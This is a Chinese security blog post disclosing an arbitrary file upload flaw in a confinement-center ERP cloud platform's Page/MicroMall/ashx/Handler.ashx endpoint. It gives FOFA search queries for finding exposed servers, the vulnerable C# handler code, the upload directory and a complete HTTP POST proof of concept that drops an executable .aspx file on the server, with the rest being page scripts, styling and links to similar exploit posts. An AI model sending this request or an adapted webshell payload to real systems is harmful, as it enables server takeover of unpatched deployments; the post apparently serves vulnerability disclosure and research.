---
title: "月子会所ERP管理云平台 Page/MicroMall/ashx/Handler.ashx 任意文件上传漏洞"
source: https://mrxn.net/jswz/mamabaohe-MicroMall-rce.html
asset_dir: assets/月子会所erp管理云平台-pagemicromallashxhandler.ashx-任意文件上传漏洞
---

# 月子会所ERP管理云平台 Page/MicroMall/ashx/Handler.ashx 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/3/3 18:25
* 816浏览
* [0评论](#comment)
* 25分钟阅读

深入探索

云计算

SQL

企业资源计划


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

月子会所ERP管理云平台是由武汉金同方科技有限公司研发团队结合行业月子中心相关企业需求开发的一套综合性管理软件。月子会所ERP管理云平台的 Page/MicroMall/ashx/Handler.ashx 接口存在任意[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞，由于未对上传文件进行任何过滤，攻击者可利用该漏洞上传恶意文件，进而获取服务器控制权。

企业资源规划

# fofa语法

> body="月子护理ERP管理平台" || body="妈妈宝盒客户端.rar" || body="Page/Login/Login3.aspx" || app="妈妈宝盒-ERP"

# 漏洞分析

深入探索

Docker加速服务

安全研究报告

安全认证考试

直接看其业务实现逻辑

```
public class Handler : IHttpHandler
{

    public void ProcessRequest(HttpContext context)
    {
        context.Response.ContentType = "text/plain";
        HttpFileCollection flist = context.Request.Files;
        string UploadfileURLList = "";
        if (context.Request.Files.Count > 0)
        {
            for (int i = 0; i < context.Request.Files.Count; i++)
            {
                HttpPostedFile mypost = flist[i];

                string picneme = mypost.FileName;
                string tuozhanming = picneme.Substring(picneme.LastIndexOf(".")).ToLower();     
                string newname = GetNewName(tuozhanming);
                UploadfileURLList += newname + "|";

                string url = System.Configuration.ConfigurationManager.AppSettings["UPLOAD_SUPPLIER_URL"].ToString();

                mypost.SaveAs(context.Server.MapPath( url + newname));
                System.Threading.Thread.Sleep(100);
            }
            UploadfileURLList = UploadfileURLList.Substring(0, UploadfileURLList.Length - 1);
        }
        context.Response.Write(UploadfileURLList);
    }
    public string GetNewName(string name)
    {
        string time = DateTime.Now.ToString("yy-MM-dd");
        string newname = time.Replace("-", "").Replace(" ", "").Replace(":", "").Replace("年", "").Replace("月", "").Replace("日", "").Replace("/", "");
        return newname + new Random().Next(0000000, 9999999) + name;

    }
```

直接上传对文件类型无任何过滤或校验，造成任意文件上传[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

UPLOAD\_SUPPLIER\_URL 位置在 web.config 设置，一般为

云存储

```
<add key="UPLOAD_SUPPLIER_URL" value="../../UploadBaseFolder/Supplier/" />
```

所以最终上传文件保存路径为 /UploadBaseFolder/Supplier/文件名

# 漏洞复现

## POC

```
POST /Page/MicroMall/ashx/Handler.ashx HTTP/1.1
Host: mamabaohe.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary123

------WebKitFormBoundary123
Content-Disposition: form-data; name="file"; filename="test.aspx"

<%@Page Language="C#"%><%Response.Write(Guid.NewGuid().ToString("N"));System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath));%>
------WebKitFormBoundary123--
```

访问上传文件 UploadBaseFolder/Supplier/响应文件名

漏洞预警服务

[![月子会所ERP管理云平台 Page/MicroMall/ashx/Handler.ashx 任意文件上传漏洞](images/img-001-cb38ad55ea40.webp)](https://image.mrxn.net/dcc6bb8d4f5c431e976ef844994162d4.webp)

成功打印随机GUID字符串并删除自身。

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)
* [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.fofa语法](#toc-2-)
* [3.漏洞分析](#toc-3-)
* [4.漏洞复现](#toc-4-)
* [4.1.POC](#toc-4-1-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[月子会所ERP管理云平台 Page/MicroMall/ashx/Handler.ashx 任意文件上传漏洞](https://mrxn.net/jswz/mamabaohe-MicroMall-rce.html)  
文章链接：<https://mrxn.net/jswz/mamabaohe-MicroMall-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

物流软件安全

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/mamabaohe-MicroMall-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

计算机服务器

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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